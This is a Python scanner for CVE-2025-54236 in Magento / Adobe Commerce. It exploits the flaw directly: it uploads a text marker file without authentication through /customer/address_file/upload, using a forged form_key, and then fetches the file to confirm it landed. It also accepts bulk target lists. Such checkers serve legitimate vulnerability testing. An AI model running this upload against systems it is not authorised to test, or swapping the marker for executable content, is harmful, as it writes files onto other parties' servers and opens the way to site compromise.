"""
Magento Unauthenticated File Upload - Checker.
This script checks for an unauthenticated arbitrary file upload vulnerability 
related to SessionReaper in Magento / Adobe Commerce, exploitable through 
the /customer/address_file/upload endpoint.

Usage:
    python magento_upload_checker.py -u https://example.com
    python magento_upload_checker.py -l targets.txt -o results.json
"""

import argparse
import json
import random
import string
import sys
import time
from datetime import datetime, timezone
from pathlib import Path
from urllib.parse import urljoin

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    print("[!] pip install requests")
    sys.exit(1)

MARKER_CONTENT = """SECURITY TEST FILE

This file was uploaded during a security verification test.

If you are the administrator of this system, your Magento instance
may allow unauthenticated file uploads via:

/customer/address_file/upload

Please update your platform and perform a full security audit,
as prior unauthorized access or compromise may have occurred.
"""
UPLOAD_PATH = "/customer/address_file/upload"
MARKER_FILENAME = "magento_upload_check.txt"
PUBLIC_URL_PATH = "media/customer_address"
SERVER_DISK_PATH = "pub/media/customer_address"


def random_string(length):
    return "".join(random.choices(string.ascii_letters + string.digits, k=length))


def normalize_url(url):
    url = url.strip().rstrip("/")
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    return url


def check_target(target, timeout=10, verify_ssl=False):
    target = normalize_url(target)
    headers = {"User-Agent": "Mozilla/5.0 (compatible; SecurityAudit/1.0)"}
    file_relative = f"/{MARKER_FILENAME[0]}/{MARKER_FILENAME[1]}/{MARKER_FILENAME}"
    disk_path = f"{SERVER_DISK_PATH}{file_relative}"
    verify_url = urljoin(target + "/", f"{PUBLIC_URL_PATH}{file_relative}")

    # Step 1: Check if file already exists
    try:
        vresp = requests.get(verify_url, headers=headers, timeout=timeout,
                             verify=verify_ssl, allow_redirects=True)
        if vresp.status_code == 200 and MARKER_CONTENT in vresp.text:
            return {
                "target": target, "vulnerable": True, "status_code": 200,
                "disk_path": disk_path, "verify_url": verify_url, "verified": True,
                "detail": "File already exists (previously uploaded)",
            }
    except requests.exceptions.RequestException:
        pass

    # Step 2: File doesn't exist yet, attempt upload
    upload_url = urljoin(target + "/", UPLOAD_PATH.lstrip("/"))
    form_key = random_string(16)

    try:
        resp = requests.post(
            upload_url,
            files={"custom_attributes[country_id]": (
                MARKER_FILENAME, MARKER_CONTENT.encode(), "text/plain",
            )},
            data={"form_key": form_key},
            cookies={"form_key": form_key},
            headers=headers,
            timeout=timeout,
            verify=verify_ssl,
            allow_redirects=True,
        )
    except requests.exceptions.ConnectionError:
        return {"target": target, "vulnerable": False, "detail": "Connection refused"}
    except requests.exceptions.Timeout:
        return {"target": target, "vulnerable": False, "detail": "Timeout"}
    except requests.exceptions.RequestException as e:
        return {"target": target, "vulnerable": False, "detail": str(e)}

    result = {"target": target, "vulnerable": False, "status_code": resp.status_code}

    if resp.status_code != 200:
        result["detail"] = f"HTTP {resp.status_code}"
        return result

    try:
        body = resp.json()
    except (json.JSONDecodeError, ValueError):
        result["detail"] = "Response is not JSON (likely not Magento)"
        return result

    if not isinstance(body, dict) or "file" not in body or body.get("error"):
        result["detail"] = f"Upload rejected: {body.get('error', body.get('message', body))}"
        return result

    # Upload succeeded - verify via GET
    uploaded_relative = body["file"]
    actual_verify_url = urljoin(target + "/", f"{PUBLIC_URL_PATH}{uploaded_relative}")
    actual_disk_path = f"{SERVER_DISK_PATH}{uploaded_relative}"

    try:
        vresp = requests.get(actual_verify_url, headers=headers, timeout=timeout,
                             verify=verify_ssl, allow_redirects=True)
        verified = vresp.status_code == 200 and MARKER_CONTENT in vresp.text
        get_detail = f"GET returned {vresp.status_code}"
    except requests.exceptions.RequestException as e:
        verified = False
        get_detail = f"GET failed: {e}"

    result["disk_path"] = actual_disk_path
    result["verify_url"] = actual_verify_url
    result["verified"] = verified

    if verified:
        result["vulnerable"] = True
        result["detail"] = "Upload + GET verified"
    else:
        result["vulnerable"] = False
        result["detail"] = f"Upload OK but {get_detail} - not vulnerable"
    return result


def load_targets(filepath):
    path = Path(filepath)
    if not path.is_file():
        print(f"[!] File not found: {filepath}")
        sys.exit(1)
    targets = [l.strip() for l in path.read_text(encoding="utf-8").splitlines()
               if l.strip() and not l.strip().startswith("#")]
    if not targets:
        print(f"[!] No targets in {filepath}")
        sys.exit(1)
    return targets


def print_result(r):
    if r["vulnerable"]:
        tag = "\033[91m[VULNERABLE]\033[0m"
    else:
        tag = "\033[92m[OK]\033[0m"

    http = f"(HTTP {r['status_code']})" if "status_code" in r else ""
    print(f"  {tag} {r['target']} {http}")
    print(f"         {r['detail']}")
    if r["vulnerable"]:
        check = "\033[92m[confirmed]\033[0m" if r.get("verified") else "\033[93m[not confirmed]\033[0m"
        print(f"         Disk path:  {r['disk_path']}")
        print(f"         Verify URL: {r['verify_url']} {check}")
    print()


def main():
    parser = argparse.ArgumentParser(description="CVE-2025-54236 Checker")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-u", "--url", help="Single target URL")
    group.add_argument("-l", "--list", help="File with target URLs")
    parser.add_argument("-o", "--output", help="Save results to JSON")
    parser.add_argument("--timeout", type=int, default=10)
    parser.add_argument("--delay", type=float, default=0.5)
    parser.add_argument("--verify-ssl", action="store_true")
    args = parser.parse_args()

    targets = [args.url] if args.url else load_targets(args.list)

    print(f"\n{'=' * 65}")
    print("  Magento Unauthenticated File Upload - Checker")
    print(f"  Targets: {len(targets)} | Timeout: {args.timeout}s")
    print(f"{'=' * 65}\n")

    results = []
    vuln_count = 0

    for i, target in enumerate(targets, 1):
        print(f"[{i}/{len(targets)}] {target}")
        r = check_target(target, timeout=args.timeout, verify_ssl=args.verify_ssl)
        r["timestamp"] = datetime.now(timezone.utc).isoformat()
        results.append(r)
        print_result(r)
        if r["vulnerable"]:
            vuln_count += 1
        if i < len(targets):
            time.sleep(args.delay)

    print(f"{'-' * 65}")
    print(f"  Done: {len(results)} checked | Vulnerable: {vuln_count} | OK: {len(results) - vuln_count}")
    print(f"{'-' * 65}")

    if args.output:
        Path(args.output).write_text(json.dumps({
            "scan_date": datetime.now(timezone.utc).isoformat(),
            "total": len(results),
            "vulnerable": vuln_count,
            "results": results,
        }, indent=2), encoding="utf-8")
        print(f"  Saved: {args.output}\n")

    sys.exit(1 if vuln_count > 0 else 0)


if __name__ == "__main__":
    main()
